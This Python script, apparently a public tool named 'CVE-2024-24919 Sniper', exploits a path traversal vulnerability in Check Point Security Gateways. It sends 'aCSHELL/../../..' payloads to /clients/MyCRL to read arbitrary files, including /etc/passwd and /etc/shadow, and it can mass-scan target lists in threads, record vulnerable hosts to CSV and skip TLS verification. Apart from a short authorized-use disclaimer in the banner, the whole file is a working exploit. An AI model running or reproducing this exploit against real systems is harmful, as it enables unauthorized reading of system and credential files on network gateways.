import requests
import argparse
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
import sys
import csv
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal
import os

# Disable SSL warnings --> Adding certificate verification is strongly advised.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

CSV_FILE = 'sniper-out.csv'
VERSION = "1.0.4"

LIGHTORANGE_COLOR = '\033[38;5;215m'
ORANGE_COLOR = '\033[38;5;208m'
LIGHTYELLOW_COLOR = '\033[38;5;229m'
DARKYELLOW_COLOR = '\033[38;5;172m'
YELLOW_COLOR = '\033[38;5;226m'
GOLDENROD_COLOR = '\033[38;5;214m'
YELLOWORANGE_COLOR = '\033[38;5;216m'
DARKGOLDENROD_COLOR = '\033[38;5;184m'
LIGHTGOLDENRODYELLOW_COLOR = '\033[38;5;227m'
CYAN_COLOR = '\033[38;5;51m'
LIGHTCYAN_COLOR = '\033[38;5;195m'
DARKCYAN_COLOR = '\033[38;5;30m'
RED_COLOR = '\033[91m'
GREY_COLOR = '\033[38;5;246m'
MAROON_COLOR = '\033[38;5;88m'
NAVY_COLOR = '\033[38;5;24m'
ENDC = '\033[0m'

def clear_screen():
    os_name = os.name
    if os_name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def show_banner():
    clear_screen()
    BANNER = f"""{LIGHTGOLDENRODYELLOW_COLOR}
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓┏┓┓┏┓  ┏┓  •      
┃ ┃┃┣ ━━┏┛┃┫┏┛┃┃━━┏┛┃┃┗┫┃┗┫  ┗┓┏┓┓┏┓┏┓┏┓
┗┛┗┛┗┛  ┗━┗┛┗━┗╋  ┗━┗╋┗┛┻┗┛  ┗┛┛┗┗┣┛┗ ┛ 
                                  ┛   {ENDC}{NAVY_COLOR}Version: {VERSION}
{ENDC}By: x.com/MohamedNab1l

{MAROON_COLOR}CVE-2024-24919 Sniper is a Check Point Security Gateway Automatic Security Scanner (CVE-2024-24919)
WARNING: This tool is intended for authorized and lawful use only. The author is not responsible for any misuse or unauthorized access of systems. Use against systems you do not have permission to access is strictly prohibited and may be illegal.{ENDC}
    """

    print(f"{BANNER}")

def perform_exploit(ip, path):
    # based on ifconfig-me work https://github.com/ifconfig-me/CVE-2024-24919-Bulk-Scanner/
    target = f'https://{ip}/clients/MyCRL'
    data = f'aCSHELL/../../../../../../../../../../..{path}'
    headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Te': 'trailers',
        'Dnt': '1',
        'Connection': 'keep-alive',
        'Content-Length': '48'
    }
    try:
        response = requests.post(target, headers=headers, data=data, verify=False)
        if response.status_code == 200:
            print(response.text)
        else:
            print(f"{RED_COLOR}Failed to exploit {ip}: {response.status_code}{ENDC}")
    except requests.exceptions.RequestException as e:
        print(f"{RED_COLOR}Request failed for {ip}: {e}{ENDC}")

def is_vulnerable(response):
    expected_headers = {
        'Server': 'Check Point SVN foundation',
        'X-UA-Compatible': 'IE=EmulateIE7',
        'X-Frame-Options': 'SAMEORIGIN'
    }
    match_count = sum(1 for k, v in expected_headers.items() if response.headers.get(k) == v)
    status_line_match = response.status_code == 200 and response.raw.version == 10  # HTTP/1.0
    return match_count >= 3 and status_line_match

def send_post_request(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Host": urlparse(url).hostname,
        "Content-Length": "39"
    }
    payloads = [
        "aCSHELL/../../../../../../../etc/passwd",
        "aCSHELL/../../../../../../../etc/shadow"
    ]
    for data in payloads:
        try:
            response = requests.post(url + "/clients/MyCRL", headers=headers, data=data, timeout=3, verify=False)
            if is_vulnerable(response):
                #print("Vulnerable URL found")
                return (url, True, response.status_code)
        except requests.exceptions.Timeout:
            print(f"{GREY_COLOR}Request timed out for {url}{ENDC}")
            return (url, False, "Timeout")
        except requests.exceptions.RequestException as e:
            print(f"{RED_COLOR}Request failed for {url}: {e}{ENDC}")
            return (url, False, str(e))
    return (url, False, response.status_code if 'response' in locals() else 'No response')


def scan_urls_from_file(file_path, num_threads):
    results = []
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file]
    
    def signal_handler(sig, frame):
        print(f"{RED_COLOR}\nScanning interrupted by user{ENDC}")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_url = {executor.submit(send_post_request, url): url for url in urls}
        for idx, future in enumerate(as_completed(future_to_url)):
            url = future_to_url[future]
            try:
                url, vulnerable, status = future.result()
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                results.append([url, vulnerable, status, timestamp])
                if vulnerable:
                    print(f"{MAROON_COLOR}[-] {idx + 1}/{len(urls)} Vulnerable: {ENDC}{url}")
                else:
                    print(f"{DARKCYAN_COLOR}[-] {idx + 1}/{len(urls)} Not Vulnerable:{ENDC} {url}")
            except Exception as e:
                print(f"{RED_COLOR}/!\ Error scanning {ENDC}{url}: {e}")

   
    with open(CSV_FILE, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["Host", "Vulnerable", "Status", "LastScanDate"])
        writer.writerows(results)
    print(f"{LIGHTGOLDENRODYELLOW_COLOR}\n[-] Results saved to {CSV_FILE}{ENDC}")


def main():
    show_banner()
    parser = argparse.ArgumentParser(description="Check Point Security Gateway Information Disclosure Scanner")
    parser.add_argument('-u', '--url', type=str, help="Target URL or IP address")
    parser.add_argument('-r', '--remote-path', type=str, default='/etc/passwd', help="Remote file path to read")
    parser.add_argument('-f', '--file', type=str, help="File containing list of target URLs or IPs")
    parser.add_argument('-t', '--threads', type=int, default=3, help="Number of threads to use for scanning")
    args = parser.parse_args()
    if args.url:
        perform_exploit(args.url, args.remote_path)
    elif args.file:
        scan_urls_from_file(args.file, args.threads)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
